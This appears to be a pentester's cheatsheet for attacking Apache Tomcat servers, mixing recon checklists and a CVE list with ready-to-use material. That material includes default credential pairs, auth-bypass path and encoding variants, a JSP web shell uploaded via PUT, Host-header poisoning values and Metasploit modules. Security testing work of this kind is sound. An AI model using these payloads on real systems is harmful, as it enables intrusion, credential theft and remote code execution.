# Tomcat Cheatsheet

## 1. Fingerprinting / recon

* Exact version via `/docs/` and `/examples/` (default distributions left unclean) and via default 404/500 error pages, which often expose the version, servlet name, real filesystem path, and full stacktrace.
* `Server:` header (often stripped/modified in production, check first regardless).
* Distinctive behavior: Tomcat's `Type Exception Report` HTML error format is fingerprintable on its own.
* `Allow:` header in response to `OPTIONS`: reveals methods actually supported by the servlet (PUT, DELETE, MOVE, PROPFIND often unintended by devs).

## 2. Manager / Host Manager

Test systematically, with and without trailing slash:

```
/manager/html
/manager/text
/manager/status
/manager/status/all
/manager/jmxproxy
/manager/serverinfo
/host-manager/html
/host-manager/text
```

Path variants to bypass an upstream filter (reverse proxy, WAF, Spring Security URL-pattern rule):

```
/manager
/manager/
/manager/.
/manager/..;/manager/html
/manager/html;jsessionid=x
/MANAGER/html          # case, Windows backend filesystem
```

Credential bruteforce: SecLists `tomcat-betterdefaultpasslist.txt`, most common historical combos (`tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`, `admin:s3cret`, `both:tomcat`, `role1:role1`).

Once access is obtained: WAR deployment via `/manager/text/deploy?path=/x&war=file:...` (local upload) or `PUT /manager/text/deploy?path=/x` (direct upload) for RCE. The `/manager/text/*` endpoint has historically had no anti-CSRF protection unlike `/manager/html`, worth remembering if credentials are known but browser login is inconvenient.

Metasploit: `auxiliary/scanner/http/tomcat_mgr_login`, `exploit/multi/http/tomcat_mgr_upload`.

## 3. AJP (Ghostcat) and JMX remote

* Port 8009 open (`nmap -p8009`), AJP exposed publicly (often meant to listen locally only).
* `mod_jk` / `mod_proxy_ajp` in front-end Apache.
* Ghostcat (CVE-2020-1938, Coyote AJP Connector < 9.0.31 / 8.5.51 / 7.0.100): unauthenticated arbitrary file read, including `WEB-INF/web.xml`, and RCE if upload is possible elsewhere. Public exploit `ajpfuzzer`, Metasploit module `auxiliary/admin/http/tomcat_ghostcat`.
* If JMX remote is exposed (typical ports 1099/9999+RMI), `JmxRemoteLifecycleListener` is vulnerable to a deserialization RCE (CVE-2016-8735, CVE-2019-12418) depending on version.

## 4. TRACE / verb tampering

```
OPTIONS /
TRACE /
```

Tomcat sometimes still answers TRACE (XST, historical HttpOnly bypass). Test systematically against a protected endpoint:

```
HEAD
OPTIONS
TRACE
PUT
DELETE
MOVE
COPY
PATCH
PROPFIND
MKCOL
SEARCH
```

`HEAD` in particular: some apps only filter GET/POST, Tomcat often routes HEAD to the same servlet without re-checking auth (a diff in response size or status code is the signal).

**HTTP/0.9 method confusion (CVE-2026-24733)**: Tomcat did not restrict HTTP/0.9 requests to GET only. If a security constraint allows HEAD but denies GET on a given URI, sending a spec-invalid HEAD request over HTTP/0.9 gets processed as GET, bypassing the constraint. Niche (requires that specific HEAD-allowed/GET-denied constraint shape) but worth a quick raw-socket test against any endpoint showing that pattern. Fixed in 11.0.15 / 10.1.50 / 9.0.113; no official fix exists for 8.5.

## 5. JSP upload / WebDAV

Whenever one of these exists, ask whether a JSP can be dropped:

* `PUT` method accepted (check `Allow:`)
* WebDAV enabled
* Multipart upload (admin form, file manager)
* DefaultServlet with `readonly=false` (CVE-2017-12617 on Tomcat 7/8/9 depending on version)

```
PUT /uploads/shell.jsp HTTP/1.1
Content-Type: application/octet-stream

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

Extension-filter bypass:

```
shell.jsp;.txt      # path parameter
shell.jspx
shell.jsw
shell.jsv
shell.jspf
shell.JSP            # case, Windows filesystem
```

## 6. DefaultServlet and protected paths

Normally forbidden by the DefaultServlet, but a misconfigured reverse proxy can let requests through (see section 8, URL normalization):

```
/WEB-INF/
/META-INF/
/WEB-INF/web.xml
/WEB-INF/classes/
/WEB-INF/lib/
/META-INF/context.xml
```

`web.xml` and `context.xml` are particularly worth it: internal servlet mappings, `crossContext`, datasources, sometimes plaintext credentials in `<Resource>` elements.

## 7. Directory listing

Check whether `listings=true` was left active on a context (DefaultServlet), notably on `ROOT` or static folders (`/uploads/`, `/static/`, `/files/`). A simple URL visit is enough, but it can reveal the full tree and files not meant to be public (backups, `.war`, `.class`, configs).

## 8. URL normalization / path parameters (;)

Priority targets: CXF/SOAP admin endpoints, management consoles, any endpoint protected by Basic Auth or a Spring Security URL-pattern filter.

Tomcat supports Servlet-spec path parameters: everything after a `;` in a URL segment is ignored for servlet routing. If the security filter evaluates the raw URL before stripping, it sees a static extension and lets it through.

```
GET /admin/service;.js
GET /admin/service;.css
GET /admin/service;.json
GET /admin/service;.png
```

Variants exploiting the same underlying normalization mismatch:

```
# jsessionid (legitimate feature, often unfiltered)
GET /admin/service;jsessionid=AAAA
GET /admin/service;jsessionid=AAAA.js

# Double slash and traversal
GET /admin//service
GET /admin/./service
GET /admin/foo/../service

# Trailing slash (filter matches the exact pattern, Tomcat normalizes)
GET /admin/service/

# Simple encoding (filter sees %70age, Tomcat routes to /admin/page)
GET /admin/%70age
GET /admin/%2e%2e/secret
GET /admin/service%00.js   # null byte, truncates the path on old Tomcat

# Double encoding / overlong UTF-8 (bypass for filters that decode only once)
GET /admin/%252e%252e/secret
GET /admin/%c0%ae%c0%ae/secret

# Case sensitivity (Windows only, case-insensitive filesystem)
GET /Admin/service
GET /ADMIN/service
```

Also relevant: CVE-2025-55752/CVE-2025-55754 (October 2025), a regression allowing directory traversal via rewritten URIs that are normalized before decoding, bypassing protections on `/WEB-INF/` and `/META-INF/`, escalating to RCE if PUT is enabled. See CVE section.

Another normalization edge case worth probing: incorrect decoding of `+` in rewritten URIs to a literal space in some Tomcat versions, which can bypass a security constraint whose pattern doesn't anticipate the resulting decoded path. Try substituting `+` for expected space-adjacent characters in any path that passes through a `RewriteRule` before hitting a security constraint.

**Quick checklist**

Compare the behavior of the normal request vs the variants. The signal is a response difference: if `/admin/page` returns 401/403 and a variant returns 200, a different size, or an application error (500), the request reached the backend without authentication. A 302 to an unexpected resource is also a valid indicator.

```bash
curl -v "http://target/admin/page;.js"
curl -v "http://target/admin/page;.css"
curl -v "http://target/admin/page;jsessionid=x"
curl -v "http://target/admin//page"
curl -v "http://target/admin/./page"
curl -v "http://target/admin/page/"
curl -v "http://target/admin/%70age"
curl -v "http://target/admin/page%00.js"
curl -v "http://target/admin/%252e%252e/page"
```

## 9. JSESSIONID and session fixation

```
;jsessionid=...          # URL rewriting
Cookie: JSESSIONID=...
```

* **Fixation**: is JSESSIONID regenerated after login? Tomcat does not do this automatically for the app unless it explicitly calls `request.changeSessionId()` (Servlet 3.1+) or `session.invalidate()` + new session. Check on every flow (login, logout, password reset) by comparing `Set-Cookie` before/after.
* **Confusion**: is a JSESSIONID passed in the URL accepted the same as one passed via cookie?
* **Cache poisoning**: a URL with `;jsessionid=` in the path can break caches that don't normalize the path before computing the cache key.

## 10. Content-Type / charset confusion

Content-Type values to test on endpoints accepting a body, some internal Java parsers diverge depending on the declared type:

```
application/json
text/plain
multipart/form-data
application/x-www-form-urlencoded
```

Charset encodings, still found on older apps:

```
ISO-8859-1
UTF-16
Shift-JIS
```

Can break authentication, routing, or open an XSS (bypassing a filter that doesn't anticipate the charset actually used at render time).

## 11. Trusted proxy headers

If Tomcat is behind a reverse proxy, check whether redirect `Location:` headers or absolute URLs generated by the app are built from client-controllable headers:

```
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Forwarded-Proto: http
```

Useful for host header injection, password-reset link poisoning, HTTPS→HTTP downgrade on generated links.

## 12. WebSocket

Tomcat implements `javax.websocket` / `jakarta.websocket`. Access controls are sometimes forgotten on the initial handshake (auth is checked on the classic HTTP path, not re-checked on the upgrade).

```
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: ...
```

Test a connection without a valid session cookie, and check whether `Origin` is validated (CSWSH, cross-site WebSocket hijacking).

## 13. Actuator (Spring Boot + embedded Tomcat)

Extremely common stack in Java enterprise environments:

```
/actuator
/actuator/env
/actuator/heapdump        # full memory dump, often plaintext secrets
/actuator/configprops
/actuator/mappings
/actuator/beans
/actuator/loggers
/actuator/threaddump
```

`/actuator/heapdump` is the most rewarding target if accessible: parse with `heapdump-parser` or similar to extract credentials/tokens in memory.

## 14. CXF / Axis / JAX-WS

```
/services
/services?wsdl
/soap
/axis2
/axis2/axis2-admin/       # Axis2 admin console
/cxf
/cxf/services             # list of exposed CXF endpoints
```

The exposed WSDL gives the full list of available operations, treat it as an attack surface map. The Axis2 console is worth testing with the known default creds (`admin:axis2`), no guarantee they're still in place.

## 15. Java deserialization

* Look for `application/x-java-serialized-object` as Content-Type, and the `rO0` base64 signature in payloads (cookies, params, custom headers).
* RMI/Hessian/Burlap/Invoker endpoints on older apps (Spring `HttpInvokerServiceExporter`, RMI-over-HTTP).
* If found, move to gadget chains with ysoserial depending on the libraries present on the classpath (Commons Collections, Spring, Groovy, etc.).
* Tomcat-specific case: session persistence (`PersistentManager` + `FileStore`), see CVE-2020-9484 / CVE-2021-25329 in the CVE section, plus the much more impactful CVE-2025-24813 (2025).

## 16. crossContext

`crossContext=true` in `context.xml`: lets one webapp access another webapp's sessions/attributes on the same Tomcat instance. Rare (disabled by default since Tomcat 5.5, explicit opt-in), but worth checking via LFI/traversal if multiple apps of different sensitivity share the same instance. Cross-app session theft if enabled.

## 17. Invoker servlet

`/servlet/<classname>`: on very old Tomcat/legacy config (disabled by default since Tomcat 5.5, 2005), lets you invoke any classpath servlet without a mapping declared in `web.xml`. Found only on legacy that hasn't been touched in 15-20 years, but high impact when present.

## 18. CGIServlet command injection

On Windows, if `enableCmdLineArguments` is active (CGIServlet disabled by default), parameters passed to a CGI script can lead to command injection via the Windows shell (CVE-2019-0232). Rare since CGI is an abandoned technology, but near-guaranteed RCE when encountered.

## 19. Versioned parallel deployment

`app##version.war`: an old vulnerable version of a webapp can stay accessible alongside the patched version if the `##` naming convention is used for hot deployment (zero-downtime, a feature still actively used in production today, unlike the legacy tricks above). Check systematically: try enumerating old version suffixes on known webapp paths.

## 20. Request smuggling

Tomcat has historically had a fairly permissive parsing of `Content-Length` / `Transfer-Encoding`, worth testing in front of a reverse proxy (nginx/Apache) for CL.TE/TE.CL desync. See CVE-2022-42252 and CVE-2023-46589 in the CVE section for documented cases. More recently, CVE-2026-24880 (April 2026) covers request smuggling via unvalidated HTTP/1.1 chunk extension content: if the reverse proxy in front of Tomcat allows CRLF sequences inside an otherwise-valid chunk extension, an attacker can inject additional content that Tomcat parses as a second request.

Also worth testing when Tomcat sits behind a proxy that forwards `Upgrade`/`Connection` headers: **h2c smuggling**, establishing a cleartext HTTP/2 (h2c) tunnel through the front-end proxy to talk directly to Tomcat's HTTP/1.1 or HTTP/2 processor, bypassing whatever path-based routing, auth, or WAF rules the proxy enforces per-request (tool: `h2csmuggler`).

## 21. TLS / SNI and virtual host confusion

If Tomcat hosts multiple virtual hosts and client-certificate authentication is enforced at the Connector level (not the webapp level) for only some of those vhosts, sending mismatched hostnames in the TLS SNI extension vs. the HTTP `Host:` header can bypass client-cert auth entirely (CVE-2025-66614): the connection negotiates against the non-cert-requiring vhost's TLS config via SNI, then the HTTP request is routed to the cert-requiring vhost via the `Host:` header. Worth checking whenever a target serves multiple vhosts off the same Tomcat instance with inconsistent client-cert requirements.

## 22. IDOR / broken access control

JAX-WS/CXF/SOAP endpoints are often less audited than classic REST endpoints: specifically test for horizontal/vertical access control issues (modifiable ID parameters, missing ownership checks).

---

## CVEs to check

* **CVE-2025-24813** (critical, CVSS 9.8): path-equivalence RCE via partial PUT requests. Requires a non-default config (writable DefaultServlet, `allowPartialPut=true`, file-based session persistence) but is the single highest-impact recent Tomcat CVE, actively exploited in the wild within 30 hours of disclosure. Affects 11.0.0-M1–11.0.2, 10.1.0-M1–10.1.34, 9.0.0-M1–9.0.98, and reportedly 8.5.0–8.5.100.
* **CVE-2025-55752** / **CVE-2025-55754** (October 2025): regression of an older fix, directory traversal via rewritten URIs normalized before decoding, bypasses `/WEB-INF/` and `/META-INF/` protections, escalates to RCE if PUT is enabled.
* **CVE-2020-1938** (Ghostcat): unauthenticated arbitrary file read via AJP.
* **CVE-2017-12617**: arbitrary JSP upload via `PUT` if `readonly=false` on the DefaultServlet.
* **CVE-2019-0232**: RCE via CGIServlet on Windows if `enableCmdLineArguments` is active.
* **CVE-2020-9484**: RCE via session deserialization if `PersistentManager`/`FileStore` is configured.
* **CVE-2021-25329**: incomplete fix for CVE-2020-9484, same vector still exploitable under certain conditions.
* **CVE-2022-42252**: request smuggling via an invalid `Content-Length` in a multipart request.
* **CVE-2023-46589**: request smuggling via malformed trailer headers.
* **CVE-2024-50379**: RCE via race condition (TOCTOU) through partial `PUT` on a case-insensitive filesystem.
* **CVE-2024-56337**: extension of CVE-2024-50379 to case-sensitive filesystems.
* **CVE-2016-8735** / **CVE-2019-12418**: deserialization RCE via `JmxRemoteLifecycleListener` if JMX remote is exposed.
* **CVE-2016-6816** / **CVE-2016-0763**: SecurityManager bypass (contexts running with a Security Manager active, rare today).
* **CVE-2021-41079**: possible authentication bypass via malformed requests on certain 10.x/9.x/8.5.x versions (verify exact version before invoking).
* **CVE-2026-24880** (April 2026): request smuggling via unvalidated HTTP/1.1 chunk extension content, exploitable when a front-end proxy allows CRLF inside chunk extensions.
* **CVE-2026-24733** (February 2026): security constraint bypass via HTTP/0.9, a HEAD request over HTTP/0.9 is processed as GET, bypassing a HEAD-allow/GET-deny constraint.
* **CVE-2025-66614** (February 2026): client-certificate authentication bypass via SNI/Host header mismatch on multi-vhost Connectors.

---

## Tools and wordlists

* [HackTricks - Tomcat](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html): manager/host-manager paths, path bypass techniques, credential wordlists.
* [SecLists - Tomcat default creds](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt)
* [PaloAltoNetworks Unit42: CVE-2025-24813 timeline and testing](https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2025-03-14-Testing-CVE-2025-24813.md)
* [GitHub PoC: CVE-2025-24813](https://github.com/sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC)
* Nmap NSE: `http-tomcat-app-scan`, `http-tomcat-application-scan` for automated recon/bruteforce.
* Metasploit: `auxiliary/scanner/http/tomcat_mgr_login`, `exploit/multi/http/tomcat_mgr_upload`, `auxiliary/admin/http/tomcat_ghostcat`.
* `heapdump-parser` (Python) to extract secrets from `/actuator/heapdump`.
* ysoserial for Java deserialization gadget chain generation.
* [h2csmuggler](https://github.com/BishopFox/h2csmuggler) for h2c smuggling through a front-end proxy to reach Tomcat directly.
